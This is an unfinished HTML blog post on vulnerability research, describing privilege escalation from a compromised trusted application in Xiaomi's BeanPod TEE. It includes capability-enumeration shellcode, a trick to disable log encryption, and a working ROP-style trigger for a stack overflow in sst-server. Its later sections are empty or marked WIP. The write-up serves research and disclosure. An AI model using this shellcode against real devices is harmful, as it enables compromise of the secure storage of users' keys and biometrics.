<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Memory Mapping in Unicorn</title>

  <!-- Prism.js syntax highlighting -->
  <link href="prism.css" rel="stylesheet" />
  <script src="prism.js"></script>
  <script src="prism-python.min.js"></script>
  <script src="prism-armasm.min.js"></script>

  <style>
    body {
      font-family: verdana, helvetica, sans-serif;
      background: #cfccc3 url(bgtransback.png) repeat-x scroll 0 0;
      color: #000000;
      margin: 0;
      padding: 0;
    }

    #container {
      max-width: 900px;
      margin: 40px auto;
      padding: 20px 40px;
    }
    
    h1, h2, h3 {
      color: #003366;
    }

    a {
      color: #003366;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    p {
      line-height: 1.5;
      font-size: 14px;
    }

    pre {
      border: 1px solid #ccc;
      padding: 10px;
      overflow-x: auto;
      background: #f8f8f8;
      font-size: 13px;
    }

    blockquote {
      border-left: 4px solid #ccc;
      padding-left: 1em;
      margin-left: 0;
      color: #333;
      font-style: italic;
    }

    hr {
      border: 0;
      border-top: 1px solid #ccc;
      margin: 2em 0;
    }
table {
      border-collapse: collapse;
      width: 60%;
      margin: 20px;
      font-size: 14px;
    }
    th, td {
      border: 1px solid #333;
      padding: 8px;
      text-align: left;
    }
    th {
      background-color: #f2f2f2;
    }

  </style>
</head>
<body>
  <div id="container">
    <h1>From S-EL0 to S-EL3, BeanPod TEE Exploitation</h1>
    <p><strong>Author:</strong> Philipp Mao</p>
    <p><strong>Date:</strong> April 2025</p>

    <p>While working on the <a href="https://www.usenix.org/system/files/usenixsecurity24-busch-tea.pdf">Spill The TeA</a> and <a href="https://www.usenix.org/system/files/usenixsecurity24-busch-globalconfusion.pdf">GlobalConfusion</a> paper (both studies on the prevalence of common TA vulnerabilities) we (me and <a href="https://mbusch.io/">Marcel(@0ddc0de)</a>) accumulated a number of vulnerable TAs. For one of these TAs, specifically the so-called keyinstall TA on the Xiaomi Note 11s, Marcel wrote a stable exploit that achieved code execution as the TA. After a delay of about one year, I decided to take his exploit and see if I could escalate privileges from the TA to compromise the TEE. I chose that TA not only because of the availability of the exploit but also because the used TEE (called BeanPod) had not been previously compromised.

    <p>This blog is a writeup of the research I did to escalate privileges and compromise the BeanPod TEE, which was done in summer 2024. With the bug I found I was able to escalate privileges from S-EL0 (code execution in a Trusted Application) to S-EL3 (arbitrary physical memory read/write). I will mainly be talking about reverse engineering and writing shellcode for interacting with arm32 IPC servers running on top of the fiasco(L4Re) microkernel.

    <h2>Background</h2>

    <p>Modern Android devices use trusted execution environments (TEEs) to store sensitive user data (biometrics, drm keys etc) and restrict access to peripherals. This technology has so far been based on ARM Trustzone, which allows partitioning execution contexts into normal and secure world. Android apps, the Android framework run in the normal world at EL0 (userspace), while the linux kernel runs at N-EL1 (normal world exception level 1). 

    <p>The components running in the secure world are trusted applications (TAs) at S-EL0. Each TA implements a specific use case from the TEE (there is for example the keymaster TA responsible for managing secure storage) and exposes that functionality to the normal world. At S-EL1 runs the TEE OS, which is responsible for running and seperating the different TAs. Finally at S-EL3 runs the secure monitor, the component responsible for orchestrating interaction between the normal and secure world. The code running inside the TEE is proprietary and comes either from the SOC or a TEE vendor. Below is a table with various SOCs and TEE implementations. This blog will be about xiaomi with the BeanPod TEE.

<table>
    <tr>
      <th>Vendor</th>
      <th>SOC</th>
      <th>TEE</th>
    </tr>
    <tr>
      <td>Xiaomi</td>
      <td>MediaTek</td>
      <td><b>BeanPod (before ~2024)</b></td>
    </tr>
    <tr>
      <td>Xiaomi</td>
      <td>MediaTek</td>
      <td>MITEE (after ~2024)</td>
    </tr>
    <tr>
      <td>Samsung</td>
      <td>Exynos</td>
      <td>TEEGRIS</td>
    </tr>
    <tr>
      <td>Samsung/Xiaomi</td>
      <td>QualComm</td>
      <td>QSEE</td>
    </tr>
  </table>

    <p>The main premise of the TEE is that only signed aka "trusted" code is run in there. Rooting a phone gives S-EL1 code execution but that does not give access to the TEE. 

    <p>The first step to compromising the TEE is to get code execution in a TA over the API exposed to the normal world, usually by exploiting a bug in the TA. Which is exactly how Marcel achieved code execution at S-EL0. I will not discuss the bug/exploitation process of the vulnerable TA for the sake of brevity. The bug and exploitation process is presented in this talk from BlackAlps 2024 by Marcel and me: <a href="https://www.blackalps.ch/ba-24/talks.php#02">GlobalConfusion: TrustZone Trusted Application 0-Days by Design</a>. 

    <p>With the above we're all caught up and running shellcode in the context of the compromised TA. How to escalate privileges from there? We will need to understand how the TA communicates with the TEE OS or (spoiler) other S-EL0 components. Reverse engineering the TA code only brings us so far, since the low level code implementing the syscalls is imported from shared libraries. We will need to get our hands on these libraries (+ all other TEE related files).

    <h2>Mapping The Attack Surface</h2>
    <p>Fortunately the BeanPod TEE ships files unencrypted in a tee.img file (Which you can find by downloading the fastboot firmware for any Xiaomi device using BeanPod and unpacking the tar). The tee.img contains various bootloaders plus a gzipped soter.img file. This soter.img file is the file actually loaded by the secure monitor to load the TEE. I wrote a small script to help unpack soter.img (<a href="dump_soter.py">dump_soter.py</a>). The resulting files:

    <pre><code class="language-armasm"> ese_server               libirq.so                   libtomcrypt.so          libuTlog.so
'fiasco -serial_esc'      libkey.so                   lib_tvm_sst.so          libuTpf_spi.so
 l4re                     libkproxy.so                lib_tvm_time.so         libuTrpmb.so
 lib4log.so               libl4sys-direct.so          libuc_c.so              libutsem.so
 lib4re-c.so              libl4sys.so                 lib_utactive.so         libuTsys_base.so
 lib4re-c-util.so         libl4util.so                libuTbta.so             libuTsys_device.so
 lib4re.so                libl4z.so                   libuTbta_util.so        libuTsys_io.so
 lib4re-util.so           libld-l4.so                 libuTcapmgr.so          libuTsys_thread.so
 libc_be_l4refile.so      libloader.so                libuTcrypto.so          libuTtime.so
 libc_be_l4re.so          libmpa.so                   libuTdrv_call.so        libvfs.so
 libc_be_sig.so           libmsg.so                   libuTdrv_framework.so   lib_virtualization.so
 libc_be_socket_noop.so   libneu_util.so              libuTfp_alipay.so       moe
 libcbor.so               liboptee.so                 libuTfp_ese.so          ned
 lib_common.so            libpthread.so               libuTfp_fido.so         ree_agent
 libc_support_misc.so     lib_ree_mem.so              libuTfp_mipay.so        sigma0
 libdl.so                 lib_seapi_inner.so         'libuTfp.so '            sst-server
 libdrivers.so            libseapi.so                 libuTfp_wechat.so       uTbtaLoader
 lib_ese_caps_alloc.so    lib_sec_manager_verify.so   libuTfs.so              uTcapmgr
 libese_spi_p73.so        libslab.so                  libuTgp_ex.so           uTMemory
 libese_spi_st.so         lib_sst_partition_cfg.so    libuTgp_nomain.so       uTSeckey
 lib_fido_tal.so          libsupc++.so                libutinfo.so            uTSecManager
 libfp_server.so          libteec++.so                libuTkeymaster.so       uTSemaphore</code></pre>


    <p>Turns out BeanPod is using the <a href="https://os.inf.tu-dresden.de/fiasco/">fiasco(L4Re)</a> microkernel (moe, ned, sigma0 and of course fiasco are all standard binaries used by L4Re). Being able to interact with a microkernel deployed in production is pretty cool. Unfortunately this also means the kernel itself is not the most promising attack surface. Instead we should look at BeanPod specific privileged processes reachable over IPC by our compromised TA. 

    <p>Fiasco uses the concept of capabilities, which govern which IPC endpoints a given process can communicate with. In a first step we should enumerate our compromised TAs capabilities and map this to other processes running in the TEE. At this point I spent some time reverse engineering the various shared libraries used by our TA to understand how it communicates with other processes over IPC.

    <p>After some time I came across the following code, analyzing a function called by the TA imported from libuTdrv.so

    <pre><code class="language-armasm">int mdrv_open(undefined4 param_1,undefined4 param_2)
{
  ...
  iVar4 = _ta_cfg;
  puVar5 = *(uint **)(l4re_global_env + 0x2c);
  if ((puVar5 != (uint *)0x0) && (puVar5[1] != 0xffffffff)) {
    while( true ) {
      pcVar6 = "ta_manager";
      puVar7 = puVar5;
      do {
        puVar1 = puVar7 + 2;
        puVar7 = (uint *)((int)puVar7 + 1);
        if (*(char *)puVar1 == '\0') goto loop_end;
        pcVar6 = pcVar6 + 1;
        if ((*pcVar6 == '\0') || (*(char *)puVar1 != *pcVar6)) goto loop_end;
      } while (pcVar6 != "r");
      if (*(char *)((int)puVar5 + 0x12) == '\0') break;
loop_end:
      if ((puVar5 + 6 == (uint *)0x0) ||
         (puVar7 = puVar5 + 7, puVar5 = puVar5 + 6, *puVar7 == 0xffffffff)) goto fail;
    }
    uVar8 = *puVar5;
    if ((uVar8 & 0x800) == 0) {
 	...
        }
fail:
  log_msg(2,5,"[%s:%d/%s] <err> %sFailed to get cap \'%s\'\n","drv_call.cc",0x17,"query_uuid",
          &DAT_00011e78,"ta_manager");
  return -1;
}</code></pre>

    <p>It looks like the code is checking if the current process has the "ta_manager" capability. It looks like standard L4Re functionality and indeed this seems to be the l4re_env_get_cap_l function (<a href="https://github.com/kernkonzept/l4re-core/blob/5450e93a863fde1d1e52ade60990841f90139b2b/l4re/include/env.h#L188">L4Re source</a>). Usually this function would be placed before the actual IPC call as a client side check to retrieve the handle associated with the capability. It would be very convenient if we could iterate over our TAs l4re_global_env that way and enumerate the capabilities.

    <h2>Retrieving the Capabilities</h2>

    <p>Before we go further I'll take a quick detour to talk about writing shellcode for the TA. I wanted to reuse the existing L4Re headers. To this end I setup the compilation pipeline to allow writing the shellcode in C and compiled to raw assembly, with seperate header files including various utility functions.

    <pre><code class="language-python">TARGET=shellcode
SRCS=shellcode.c

all: $(TARGET).bin

shellcode.bin: mdrv.h stdlib.h l4utils.h shellcode.c
        arm-none-eabi-gcc -march=armv8-a -Os -Wall -static -nostdlib -fno-asynchronous-unwind-tables -fpic -c -o shellcode.o shellcode.c
        arm-none-eabi-gcc -static -nostdlib -fno-asynchronous-unwind-tables -fpic shellcode.o -Wl,-Tscript.T,--build-id=none -o shellcode.elf
        arm-none-eabi-objcopy -O binary $(TARGET).elf $(TARGET).bin</code></pre>

  <p>l4utils.h implements various l4 helper functions, including the function to extract the capabilities of a TA. l4utils.h itself includes the original L4Re headers, which I copied over from a checkout of the L4Re source code. The enum_caps function in l4utils.h enumerates the current processes capabilities.

<pre><code class="language-armasm">void enum_caps(l4re_env_t* e){
        l4re_env_cap_entry_t const *c = e->caps;
        logprintf2("e->caps: %x\n", c);
        for (; c && c->flags != ~0UL; ++c){
                logprintf2("cap: %s\n", c->name);
                }
   }</code></pre>

   <p>The address of the l4re_env global in lubTdrv is in the libraries data section at a constant offset from the library base. The only requirement is to find the libraries loaded address. Fortunately, BeanPod does not use ASLR and thus the library is always mapped at a fixed offset. However, initially the address of libuTdrv.so is not known. Fortunately the TA is always mapped at a known addresss and the GOT of the TA points to the library. Following pointers originating from the TA in this way we can obtain the fixed addresses for almost all relevant libraries. The following code in the shellcode enumerates the current TA's capabilities:

<pre><code class="language-armasm">#define liuTrdv_l4re_global_env_off 0xa200
#define mdrv_open_off 0xb88
...
int* mdrv_open_got = (int*)0x1d1e0; //fixed
logprintf2("mdrv_open => handle: %x\n", driver_handle);
int libuTdrv_base = *mdrv_open_got - mdrv_open_off;
int l4re_global_env = libuTdrv_base + liuTrdv_l4re_global_env_off;
logprintf2("l4re_global_env**: 0x%x\n", l4re_global_env);
l4re_global_env = *(int*)l4re_global_env;
logprintf2("l4re_global_env*: 0x%x\n", l4re_global_env);
l4re_global_env = *(int*)l4re_global_env;
logprintf1("==== checking caps ==== \n");
enum_caps(l4re_global_env);</code></pre>

    <p>To exfiltrate data we use the existing TEE logging infrastructure (TEE_LogPrintf), which we can read from the normal world in the kernel log (dmesg). TEE_LogPrintf is wrapped by logprintf2 in our stdlib.h. While this is very convenient, in the newest update back in 2024 BeanPod introduced log encryption. Instead of pivoting to simply using shared memory to exfiltrate data, I instead wasted a day to at least partially disable the log encryption... Basically in the various logging functions a check on a new global (__beanpod_disable_log_enc) was introduced. By default this global is NULL and the log sent to the normal world is encrypted. In the shellcode we can simply write to this global to disable the log encryption (at least for the TA process). Running the shellcode we get the following output showing the various capabilities of our TA:

    <pre><code class="language-python">[   69.024705] [TZ_LOG] ta_keyin| mdrv open got: 0x2bb88\x0d
[   69.024706] [TZ_LOG] ta_keyin| libuTdrv_base: 0x2b000\x0d
[   69.024714] [TZ_LOG] ta_keyin| l4re_global_env**: 0x35200\x0d
[   69.024716] [TZ_LOG] ta_keyin| l4re_global_env*: 0xb1007df0\x0d
[   69.024743] [TZ_LOG] ta_keyin| ==== checking caps ==== \x0d
[   69.024744] [TZ_LOG] ta_keyin| e->caps: b1007e20\x0d
[   69.024746] [TZ_LOG] ta_keyin| cap: sst_client\x0d
[   69.024748] [TZ_LOG] ta_keyin| cap: TZ_crypto\x0d
[   69.024749] [TZ_LOG] ta_keyin| cap: TZ_sem\x0d
[   69.024751] [TZ_LOG] ta_keyin| cap: memory_client_ns\x0d
[   69.024753] [TZ_LOG] ta_keyin| cap: memory_client\x0d
[   69.024754] [TZ_LOG] ta_keyin| cap: TZ_vfs\x0d
[   69.024756] [TZ_LOG] ta_keyin| cap: ta_ns\x0d
[   69.024757] [TZ_LOG] ta_keyin| cap: ta_manager\x0d
[   69.024759] [TZ_LOG] ta_keyin| cap: TZ_devinf\x0d
[   69.024761] [TZ_LOG] ta_keyin| cap: TZ_reetime\x0d
[   69.024762] [TZ_LOG] ta_keyin| cap: rom\x0d
[   69.024764] [TZ_LOG] ta_keyin| cap: ta_service\x0d
[   69.024765] [TZ_LOG] ta_keyin| cap: tee_server\x0d</code></pre>

    <p>The capabilities themselves do not map directly to the attack surface. In L4Re a lua script is used by ned (the init process) to bootstrap the system, including starting IPC servers and assigning capabilities to them. This lua script is stored inline in the binary for BeanPod. You can have a look at the complete file <a href="l4setup.lua">here</a>. The most important part for us is how to map capabilities to processes. For example the TZ_crypto capability maps to the uTSeckey process in the following way:
    
<pre><code class="language-python">local uTSeckey_crypto = l:new_channel();
...
--------------------------------------------------------------------------------
--                                utseckey server
--------------------------------------------------------------------------------
l:start({
    caps= {
        TZ_key = uTSeckey:svr(),
        TZ_vfs = uTgate_vfs,
        TZ_sem = uTsem,
        memory_client_ns = uTMemory_ns,
        memory_client = uTMemory,
        ---- drm
        TZ_devinf = uTSeckey_devinf:svr(),
        TZ_crypto = uTSeckey_crypto:svr(),
    },
    scheduler = L4.Env.user_factory:create(L4.Proto.Scheduler, 0xa0, 0x90),
    log = {"uTSeckey", "B"},
}, "rom/uTSeckey");</code></pre>

    <p>The first line sets up a new IPC channel. Then the l:start function starts the uTSeckey process and assigns it as the server for the uTSeckey_crpyto IPC channel. Later on in the file we can see that the BTA (BeanPod TA) Loader process is given access to teh uTSeckey_crypto (aliased to TZ_crypto) IPC channel. The BTA Loader process is responsible for loading TAs and TAs inherit their capabilities from this process.

<pre><code class="language-python">------------------------------------------------------------------------
--                                BTA loader
------------------------------------------------------------------------
wait_4_reeagent:wait_4_reeagent();
print("begin to start bta loader.");
l:start(
    caps = {
        -- TODO: for unittest only, should be disabled when unittest is disabled
        test_namespace = test_namespace,
        memory_client = uTMemory,
        memory_client_ns = uTMemory_ns,
        TZ_vfs = uTgate_vfs,
        TZ_msg = uTgate_msg,
        TZ_reetime = uTgate_reetime,
        TZ_capmgr = uTcapmgr,
        TZ_sem = uTsem,
        TZ_key = uTSeckey,
        TZ_devinf = uTSeckey_devinf,
        TZ_crypto = uTSeckey_crypto, //TZ_crypto
        icu = L4.Env.icu,
        irq_state = uTgate_irq,
        sst_dyn_creat = uTsst_create_partition,
        VSD = verify_namespace,
        sec_manager = sec_manager,
        sec_mgr_produce = sec_mgr_produce,
        fp_server = fingerprint,
        ---- tui
        tui_notice_c = uTtui_notice,
        tui_display_c = uTtui_display,
        -- static SST cap for uTAgent
        sst_l1_system = uTsst_l1_system,
        sst_l2_tee_00 = uTsst_tee_00,
        -- static SST cap for Alipay
        sst_l1_tee_01 = uTsst_l1_tee_01,
        sst_l2_tee_01 = uTsst_tee_01,
        sst_l1_km = uTsst_l1_tee_km,
        sst_l2_km = uTsst_tee_06,
        ese_dyn_cap = ese_dyn_cap_alloc,
        tee_server_s = utgate_to_bta_loader:svr(),
        tee_server = vnet_to_bta_loader:svr(),
    },
    scheduler = L4.Env.user_factory:create(L4.Proto.Scheduler, 0xa0, 0x90),
    log = { "uTbtaLdr" ,"y"},
    l4re_dbg = L4.Dbg.Warn,
}, "rom/uTbtaLoader");</code></pre>

    <p>At this point we have finally mapped the attack surface from the TA to other privileged components. The final list of IPC endpoints our TA can communicate with is the following (which we can map statically by inspecting the lua setup script).

<table>
    <tr>
      <th>Process</th>
      <th>Capability</th>
    </tr>
    <tr>
      <td>sst-server</td>
      <td>sst_client</td>
    </tr>
    <tr>
      <td>uTSeckey</td>
      <td>TZ_crypto,TZ_devinf</td>
    </tr>
    <tr>
      <td>uTSemaphore</td>
      <td>TZ_sem</td>
    </tr>
    <tr>
      <td>uTMemory</td>
      <td>memory_client,memory_client_ns</td>
    </tr>
<tr>
      <td>ree_agent</td>
      <td>TZ_vfs,TZ_reetime</td>
    </tr>
<tr>
      <td>gptee_server</td>
      <td>tee_server</td>
    </tr>
  </table>

    <h2>Reverse Engineering IPC Servers</h2>
    
    <p>To figure out what an IPC endpoint we can either reverse engineer the client library to figure out what the API is doing. To find bugs in the IPC handling code we need to find the function handling incoming IPC requests. Looking at the L4Re example IPC server <a href="https://l4re.org/doc/examples_2libs_2l4re_2streammap_2server_8cc-example.html">example</a>, we can see that the IPC server registers an L4::Server object with the capability name overwriting the dispatch function to the application-specific function. By looking for the capability name in the IPC server binary and then following it's usage, it's possible to identify the dispatch function for the relevant capability.

    <p>The server's dispatch function takes three arguments. The this pointer in r0, pointing to the server object. The rights bits in r1 (not sure what this is used for) and the Iostream in r2. The Iostream points to a buffer that contains the data sent by the client. The client populates this buffer by first retrieving it's <a href="https://l4re.org/doc/group__l4__utcb__api.html">utcb</a> and writing to the messsage registers. In BeanPod the norm seems to be to write the command id (identifying which function to call in the server) to MR0 and then writing the remaining arguments to MR1, MR2 etc.. The following decompilation  code shows an example of a client IPC call. (This function is called in mdrv_open, calling command id 2 in the ubTaManager, ta_manager IPC channel).

<pre><code class="language-armasm">uVar7 = l4_utcb_wrap();
puVar2 = (undefined4 *)uVar7;
*puVar2 = 2; //command id
puVar2[1] = driver_id;
uVar6 = (*(code *)&SUB_fffffff4)(2,(int)((ulonglong)uVar7 >> 0x20),uVar6 & 0xfffff800 | 3,0); //IPC call</code></pre>

    <p>l4_utcb_wrap retrieves the UTCB and the call to 0xfffffff4 traps to the kernel and initiates the IPC call. MR0 is set to 2 and MR1 is set to the first argument of the IPC function. In the dispatch function the received IPC function is parsed. Unfortunately the decompilation of the inline handling of the Iostream object is not very readable but should be understandable if you squint hard enough...

<pre><code class="language-armasm"> undefined4 bta_manger::dispatch(undefined4 param_1,undefined4 param_2,L4::Ipc::Iostream *iostream)
_current_msg = iostream->_current_msg;
uVar10 = iostream->_pos + 3 & 0xfffffffc;
iostream->_pos = uVar10;
..
opcode = *(undefined4 *)(_current_msg + uVar10);
iostream->_pos = uVar7;
uVar12 = uVar7;
switch(opcode) {
...
case 2: {
	/* this is presumably the uuid resolving function */
	...
	iostream->_pos = uVar8 + 4;
	if (uVar8 + 8 < 0xfd) {
		mdrv_uuid? = *(int *)(_current_msg + uVar8 + 4);
		iostream->_pos = uVar8 + 8;
	}
	else {
		mdrv_uuid? = 0;
}</code></pre>
    
    <p>Now we're finally ready to look for vulnerabilities in the IPC servers.. 

    <h2>Stack Buffer Overflow in sst-server</h2>

    <p>The sst-server is not exactly the best example the reverse engineering process outlined above because there is actually no reference to the "sst_client" string. However there seems to be a default dispatch function and by looking at the client libraries we can correlate the command ids handled in the switch statement to the sst_client capability. In command 0x41 the do_vfs_work function is called which copies data to the stack using the length provided in the MR7. The pointer at MR9 (puVar4 + 8) points to the filepath, i.e., user controlled data.

<pre><code class="language-armasm">puVar4 = (undefined4 *)utcb;
uVar5 = puVar3[2];
switch(*puVar4) {
	case 0x41: {
	/* sst_l2_fopen */
	memset(acStack_218,0,0x101);
	memset(auStack_114,0,0x101);
	/* stack overflow */
	memcpy(auStack_114,puVar4 + 8,puVar4[6]); //lenght is MR7, data is MR9
	snprintf(acStack_218,0x101,"/data/vendor/thh/%s/%s",uVar5,auStack_114);
..</code></pre>

    <p>All this effort to end up with a trivial stack buffer overflow :'D... The client code which calls this function in libuTfs.so also does not check the size of the filepath so the vulnerability can be triggered by simply calling the sst_l2_fopen function in the shared library with a file path of size > 0x101. If we however want to overflow with null bytes we need to make the IPC call ourselves.The following shellcode triggers the stack buffer overflow and calls the log function in the sst-server to pprint the "SST!!!" string to the kernel log. (Of course there are also no stack canaries).

<pre><code class="language-armasm">logprintf1("==== sst-shit ==== \n");
int ov_size = 0x200;
char* file_path_ = do_malloc(ov_size);
unsigned char cycl[] = {
0x61, 0x61, 0x61, 0x61, 0x62, ... };
file_path_ = cycl;
file_path_[ov_size-1] = 0;
// stack pointer: 0x80007d00
// sst-server base: 0x8000
// 0x0000f630 : mov r2, #1 ; blx r6
// offset of r6 268
// 0x0000f628 : mov r0, r5 ; mov r1, #0 ; mov r2, #1 ; blx r6
// offset of r5 264
// puts: 0x99cc
unsigned int sst_server_data = 0xf628;
//int* payload = (int*)*(int*)sst_server_data;
unsigned int payload = sst_server_data;
//payload = payload + 0x20;
logprintf2("payload addr: 0x%x\n", payload);
unsigned int* pc_wow = (unsigned int*)&file_path_[272];
pc_wow[0] = payload;
unsigned int* r6 = (unsigned int*)&file_path_[268];
r6[0] = 0x99cc;
unsigned int* r5 = (unsigned int*)&file_path_[264];
r5[0] = 0x80007b80;
file_path_[101] = 'S';
file_path_[102] = 'S';
file_path_[103] = 'T';
file_path_[104] = '!';
file_path_[105] = '!';
file_path_[106] = '!';
file_path_[107] = '!';
file_path_[108] = '!';
file_path_[109] = '\x00';
char* mode = "r\x00";
int lib_tvm_sst_base = 0x297000;
int log_msg_got = lib_tvm_sst_base + 0x104e8;
// trigger overflow
do_fopen_manual(lib_tvm_sst_base, file_path_, 280);</code></pre>

   <p>The do_fopen_manual function actually makes the IPC call to the sst-server, adjusting the size parameter from the strlen value to 280. We leverage the lib_tvm_sst_base library in order to avoid fully building the IPC call (which also involves setting up shared memory between the server), instead using the intermediate functions in this library to setup the shared memory.
   
    <h4>Demo</h4>

    <video controls width="640" height="360">
  <source src="sst_ov.mp4" type="video/mp4">
</video> 

    <h2>Mapping Arbitrary Physical Memory</h2>

    <p>The sst-server has a number of capabilities our TA does not have, by exploiting this stack overflow we could escalate capabilities. However finalizing the exploit for the TA was already annoying enough I did not feel like exploiting the overflow to achieve shellcode execution in the sst-server. Instead I looked for another vulnerability. 

    

    <h2>Conclusion</h2>
	WIP


  </div>
</body>
</html>
